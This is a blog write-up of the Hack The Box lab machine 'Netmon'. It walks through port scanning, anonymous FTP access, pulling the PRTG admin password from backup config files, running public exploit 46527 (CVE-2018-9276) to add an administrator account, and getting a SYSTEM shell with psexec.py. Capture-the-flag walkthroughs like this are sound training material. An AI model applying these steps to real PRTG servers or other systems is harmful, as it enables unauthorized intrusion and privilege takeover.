@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Netmon | blah blah Recon masscan m4rc0ff@SittingDucks:~$ sudo masscan -p1-65535 10.10.10.152 -e tun0 --rate=1000 [sudo] password for m4rc0ff: Starting...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Netmon</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-06-05 15:26:00+01:00">Fri 05 June 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Netmon.html">Netmon</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Netmon.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>blah blah </p>
+<h1 id="recon">Recon</h1>
+<h3 id="masscan">masscan</h3>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo masscan -p1-65535 <span class="m">10</span>.10.10.152 -e tun0 --rate<span class="o">=</span><span class="m">1000</span>
+<span class="go">[sudo] password for m4rc0ff: </span>
+
+<span class="go">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-05 13:25:23 GMT</span>
+<span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span>
+<span class="go">Initiating SYN Stealth Scan</span>
+<span class="go">Scanning 1 hosts [65535 ports/host]</span>
+<span class="go">Discovered open port 135/tcp on 10.10.10.152                                   </span>
+<span class="go">Discovered open port 49667/tcp on 10.10.10.152                                 </span>
+<span class="go">Discovered open port 49664/tcp on 10.10.10.152                                 </span>
+<span class="go">Discovered open port 80/tcp on 10.10.10.152                                    </span>
+<span class="go">Discovered open port 49666/tcp on 10.10.10.152                                 </span>
+<span class="go">Discovered open port 139/tcp on 10.10.10.152                                   </span>
+<span class="go">Discovered open port 49668/tcp on 10.10.10.152                                 </span>
+<span class="go">Discovered open port 49669/tcp on 10.10.10.152                                 </span>
+<span class="go">Discovered open port 49665/tcp on 10.10.10.152                                 </span>
+<span class="go">Discovered open port 47001/tcp on 10.10.10.152                                 </span>
+<span class="go">Discovered open port 21/tcp on 10.10.10.152                                    </span>
+<span class="go">Discovered open port 5985/tcp on 10.10.10.152                                  </span>
+<span class="go">Discovered open port 445/tcp on 10.10.10.152</span>
+</pre></div>
+
+
+<h3 id="nmap-detailed-scan-on-ports-found-by-masscan">nmap (detailed scan on ports found by masscan)</h3>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV -p135,49667,49664,80,49666,139,49668,49669,49665,47001,21,5985,445 <span class="m">10</span>.10.10.152
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 14:32 BST</span>
+<span class="go">Nmap scan report for 10.10.10.152</span>
+<span class="go">Host is up (0.093s latency).</span>
+
+<span class="go">PORT      STATE SERVICE      VERSION</span>
+<span class="go">21/tcp    open  ftp          Microsoft ftpd</span>
+<span class="go">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+<span class="go">| 02-03-19  12:18AM                 1024 .rnd</span>
+<span class="go">| 02-25-19  10:15PM       &lt;DIR&gt;          inetpub</span>
+<span class="go">| 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs</span>
+<span class="go">| 02-25-19  10:56PM       &lt;DIR&gt;          Program Files</span>
+<span class="go">| 02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)</span>
+<span class="go">| 02-03-19  08:08AM       &lt;DIR&gt;          Users</span>
+<span class="go">|_02-25-19  11:49PM       &lt;DIR&gt;          Windows</span>
+<span class="go">| ftp-syst: </span>
+<span class="go">|_  SYST: Windows_NT</span>
+<span class="go">80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)</span>
+<span class="go">|_http-server-header: PRTG/18.1.37.13946</span>
+<span class="go">| http-title: Welcome | PRTG Network Monitor (NETMON)</span>
+<span class="go">|_Requested resource was /index.htm</span>
+<span class="go">|_http-trane-info: Problem with XML parsing of /evox/about</span>
+<span class="go">135/tcp   open  msrpc        Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span>
+<span class="go">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span>
+<span class="go">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="go">|_http-title: Not Found</span>
+<span class="go">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="go">|_http-title: Not Found</span>
+<span class="go">49664/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49665/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49666/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49667/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49668/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">49669/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="go">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: mean: -2m36s, deviation: 0s, median: -2m37s</span>
+<span class="go">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span>
+<span class="go">| smb-security-mode: </span>
+<span class="go">|   account_used: guest</span>
+<span class="go">|   authentication_level: user</span>
+<span class="go">|   challenge_response: supported</span>
+<span class="go">|_  message_signing: disabled (dangerous, but default)</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   2.02: </span>
+<span class="go">|_    Message signing enabled but not required</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2020-06-05T13:31:08</span>
+<span class="go">|_  start_date: 2020-06-05T13:22:00</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 69.01 seconds</span>
+</pre></div>
+
+
+<p>I can see there is an FTP server and that anonymous login is enabled so I start having a look. While browsing within the directories, I found the <code>user.txt</code> flag. Way too easy!</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$</span> ftp <span class="m">10</span>.10.10.152
+<span class="go">Connected to 10.10.10.152.</span>
+<span class="go">220 Microsoft FTP Service</span>
+<span class="go">Name (10.10.10.152:m4rc0ff): anonymous</span>
+<span class="go">331 Anonymous access allowed, send identity (e-mail name) as password.</span>
+<span class="go">Password:</span>
+<span class="go">230 User logged in.</span>
+<span class="go">Remote system type is Windows_NT.</span>
+<span class="go">ftp&gt; ls -la</span>
+<span class="go">200 PORT command successful.</span>
+<span class="go">125 Data connection already open; Transfer starting.</span>
+<span class="go">11-20-16  10:46PM       &lt;DIR&gt;          $RECYCLE.BIN</span>
+<span class="go">02-03-19  12:18AM                 1024 .rnd</span>
+<span class="go">11-20-16  09:59PM               389408 bootmgr</span>
+<span class="go">07-16-16  09:10AM                    1 BOOTNXT</span>
+<span class="go">02-03-19  08:05AM       &lt;DIR&gt;          Documents and Settings</span>
+<span class="go">02-25-19  10:15PM       &lt;DIR&gt;          inetpub</span>
+<span class="go">06-05-20  09:21AM            738197504 pagefile.sys</span>
+<span class="go">07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs</span>
+<span class="go">02-25-19  10:56PM       &lt;DIR&gt;          Program Files</span>
+<span class="go">02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)</span>
+<span class="go">02-25-19  10:56PM       &lt;DIR&gt;          ProgramData</span>
+<span class="go">02-03-19  08:05AM       &lt;DIR&gt;          Recovery</span>
+<span class="go">02-03-19  08:04AM       &lt;DIR&gt;          System Volume Information</span>
+<span class="go">02-03-19  08:08AM       &lt;DIR&gt;          Users</span>
+<span class="go">02-25-19  11:49PM       &lt;DIR&gt;          Windows</span>
+<span class="go">226 Transfer complete.</span>
+<span class="go">ftp&gt; cd Users</span>
+<span class="go">250 CWD command successful.</span>
+<span class="go">ftp&gt; cd Public</span>
+<span class="go">250 CWD command successful.</span>
+<span class="go">ftp&gt; ls -la</span>
+<span class="go">200 PORT command successful.</span>
+<span class="go">125 Data connection already open; Transfer starting.</span>
+<span class="go">02-03-19  08:08AM       &lt;DIR&gt;          AccountPictures</span>
+<span class="go">02-03-19  12:18AM       &lt;DIR&gt;          Desktop</span>
+<span class="go">07-16-16  09:16AM                  174 desktop.ini</span>
+<span class="go">02-03-19  08:05AM       &lt;DIR&gt;          Documents</span>
+<span class="go">07-16-16  09:18AM       &lt;DIR&gt;          Downloads</span>
+<span class="go">07-16-16  09:18AM       &lt;DIR&gt;          Libraries</span>
+<span class="go">07-16-16  09:18AM       &lt;DIR&gt;          Music</span>
+<span class="go">07-16-16  09:18AM       &lt;DIR&gt;          Pictures</span>
+<span class="go">02-03-19  12:35AM                   33 user.txt</span>
+<span class="go">07-16-16  09:18AM       &lt;DIR&gt;          Videos</span>
+<span class="go">226 Transfer complete.</span>
+<span class="go">ftp&gt; get user.txt</span>
+<span class="go">local: user.txt remote: user.txt</span>
+<span class="go">200 PORT command successful.</span>
+<span class="go">125 Data connection already open; Transfer starting.</span>
+<span class="go">WARNING! 1 bare linefeeds received in ASCII mode</span>
+<span class="go">File may not have transferred correctly.</span>
+<span class="go">226 Transfer complete.</span>
+<span class="go">33 bytes received in 0.09 secs (0.3641 kB/s)</span>
+</pre></div>
+
+
+<p>once downloaded, we can read the file:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$</span> cat user.txt 
+<span class="go">dd****************************a5</span>
+</pre></div>
+
+
+<p>Visiting the website on port 80 i can see this:</p>
+<p><img alt="" src="../images/netmon_gui.png"></p>
+<p>this explained why the box is dubbed <code>netmon</code>. We can see we are dealing with <code>PRTG Ntwork Monitor 18.1.37.13946</code>. I kept searching for an exploit but i only found this RCE with <code>searchsploit</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                                           | windows/webapps/46527.sh</span>
+</pre></div>
+
+
+<p>Although version wise is valid, the explit requires us to be authenticated.</p>
+<p>After some research I found <a href="https://www.paessler.com/about-prtg-17-4-35-through-18-1-37">this article</a> on paessler website talking about exposed credentials on PRTG backup files stored on <code>C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old</code>. </p>
+<p>I noticed there is the same directory in the FTP server containing 3 PRTG configuration files:</p>
+<div class="highlight"><pre><span></span><span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff 1159598 Jun  8 10:25 &#39;PRTG Configuration.dat&#39;</span>
+<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff 1159598 Jun  8 10:25 &#39;PRTG Configuration.old&#39;</span>
+<span class="go">-rw-r--r-- 1 m4rc0ff m4rc0ff 1124497 Jun  8 10:25 &#39;PRTG Configuration.old.bak&#39;</span>
+</pre></div>
+
+
+<p>I also gathered online that the default admin user is <code>prtgadmin</code>. With that in mind I do a grep on the three files hoping to find valid credentials:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$</span> grep -i -B10 -A10 prtgadmin PRTG<span class="se">\ </span>Configuration.*
+<span class="go">&lt;SNIP&gt;</span>
+<span class="go">PRTG Configuration.old.bak-            &lt;dbpassword&gt;</span>
+<span class="go">PRTG Configuration.old.bak:           &lt;!-- User: prtgadmin --&gt;</span>
+<span class="go">PRTG Configuration.old.bak-           PrTg@dmin2018</span>
+<span class="go">PRTG Configuration.old.bak-            &lt;/dbpassword&gt;</span>
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>As shown above we found the credentials <code>prtgadmin/PrTg@admin2018</code>. I tried them out but I was unable to login:</p>
+<p><img alt="" src="../images/netmon_Loginfailed.png"></p>
+<p>So what's the next password you would try if this one failed? Since the password was found on an old backup file with <code>2018</code> on it, I would think to try the same password but with <code>2019</code>. </p>
+<p><img alt="" src="../images/netmon_Login.png"></p>
+<p>The password worked and we are in! </p>
+<p>Let's see now how we can use the exploit we found earlier, that is exploit <code>46527</code>. In summary the exploit leverages a capability of PRTG Netmon of running external programs as part of a "notification" feature. One of the default demo scripts, that is <code>Demo EXE notification - OutFile.ps1</code> was found weak in that the "parameter" field of the "notification" configuration is passed directly into the PowerShell script without any sanitization, resulting in the ability to inject any PowerShell code. More details can be found <a href="https://www.codewatch.org/blog/?p=453">https://www.codewatch.org/blog/?p=453</a>. </p>
+<p>Because PRTG Netmon services by default run as <code>local system</code> any command that we will try will run with administrative privileges. The exploit is a bash script that will leverage the above vulnerability to execute a command to create a user called <code>pentest</code> with password <code>P3nT3st</code> and add the user to the <code>administrators</code> group. Let's see it in action:</p>
+<div class="highlight"><pre><span></span>m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$ ./46527.sh 
+
+<span class="o">[</span>+<span class="o">]</span><span class="c1">#########################################################################[+] </span>
+<span class="o">[</span>*<span class="o">]</span> Authenticated PRTG network Monitor remote code execution                <span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>+<span class="o">]</span><span class="c1">#########################################################################[+] </span>
+<span class="o">[</span>*<span class="o">]</span> Date: <span class="m">11</span>/03/2019                                                        <span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>+<span class="o">]</span><span class="c1">#########################################################################[+] </span>
+<span class="o">[</span>*<span class="o">]</span> Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            <span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>+<span class="o">]</span><span class="c1">#########################################################################[+] </span>
+<span class="o">[</span>*<span class="o">]</span> Vendor Homepage: https://www.paessler.com/prtg                          <span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>*<span class="o">]</span> Version: <span class="m">18</span>.2.38                                                        <span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>*<span class="o">]</span> CVE: CVE-2018-9276                                                      <span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>*<span class="o">]</span> Reference: https://www.codewatch.org/blog/?p<span class="o">=</span><span class="m">453</span>                        <span class="o">[</span>*<span class="o">]</span> 
+<span class="o">[</span>+<span class="o">]</span><span class="c1">#########################################################################[+] </span>
+
+<span class="c1"># login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.</span>
+<span class="c1"># run the script to create a new user &#39;pentest&#39; in the administrators group with password &#39;P3nT3st!&#39; </span>
+
+<span class="o">[</span>+<span class="o">]</span><span class="c1">#########################################################################[+] </span>
+ EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c <span class="s2">&quot;_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1&quot;</span> 
+</pre></div>
+
+
+<p>As per the script usage instructions, we first need to login to the PRTG netmon interface and then we need to grab the cookies. We can do that using the browser developer tools (F12) and going to the "Network" tab in the left panel and the "Cookies" tab in the right panel:</p>
+<p><img alt="" src="../images/netmon_cookies.png"></p>
+<p>Once we grab the cookies we can run the command as follows:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$</span> ./46527.sh -u http://10.10.10.152 -c <span class="s2">&quot;_ga=GA1.4.1580492822.1591611849; _gid=GA1.4.1769898011.1591611849; OCTOPUS1813713946=e0E5RDJGMDg5LTQ4NjMtNEQxQy04RDFGLUFBMjVFNDRGMjExNn0=; _gat=1&quot;</span>
+
+<span class="gp">[+]#</span><span class="c1">########################################################################[+] </span>
+<span class="go">[*] Authenticated PRTG network Monitor remote code execution                [*] </span>
+<span class="gp">[+]#</span><span class="c1">########################################################################[+] </span>
+<span class="go">[*] Date: 11/03/2019                                                        [*] </span>
+<span class="gp">[+]#</span><span class="c1">########################################################################[+] </span>
+<span class="go">[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] </span>
+<span class="gp">[+]#</span><span class="c1">########################################################################[+] </span>
+<span class="go">[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] </span>
+<span class="go">[*] Version: 18.2.38                                                        [*] </span>
+<span class="go">[*] CVE: CVE-2018-9276                                                      [*] </span>
+<span class="go">[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] </span>
+<span class="gp">[+]#</span><span class="c1">########################################################################[+] </span>
+
+<span class="gp">#</span> login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
+<span class="gp">#</span> run the script to create a new user <span class="s1">&#39;pentest&#39;</span> in the administrators group with password <span class="s1">&#39;P3nT3st!&#39;</span> 
+
+<span class="gp">[+]#</span><span class="c1">########################################################################[+] </span>
+
+<span class="go"> [*] file created </span>
+<span class="go"> [*] sending notification wait....</span>
+
+<span class="go"> [*] adding a new user &#39;pentest&#39; with password &#39;P3nT3st&#39; </span>
+<span class="go"> [*] sending notification wait....</span>
+
+<span class="go"> [*] adding a user pentest to the administrators group </span>
+<span class="go"> [*] sending notification wait....</span>
+
+
+<span class="go"> [*] exploit completed new user &#39;pentest&#39; with password &#39;P3nT3st!&#39; created have fun!</span>
+</pre></div>
+
+
+<p>Then we can use <code>psexec.py</code> to get a shell and grab the root flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$</span> psexec.py pentest:<span class="s1">&#39;P3nT3st!&#39;</span>@10.10.10.152
+<span class="go">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span>
+
+<span class="go">[*] Requesting shares on 10.10.10.152.....</span>
+<span class="go">[*] Found writable share ADMIN$</span>
+<span class="go">[*] Uploading file svBIWdCU.exe</span>
+<span class="go">[*] Opening SVCManager on 10.10.10.152.....</span>
+<span class="go">[*] Creating service jBYn on 10.10.10.152.....</span>
+<span class="go">[*] Starting service jBYn.....</span>
+<span class="go">[!] Press help for extra shell commands</span>
+<span class="go">Microsoft Windows [Version 10.0.14393]</span>
+<span class="gp gp-VirtualEnv">(c)</span> <span class="go">2016 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;whoami</span>
+<span class="go">nt authority\system</span>
+
+<span class="go">C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt</span>
+<span class="go">30****************************cc</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Netmon.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Netmon"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
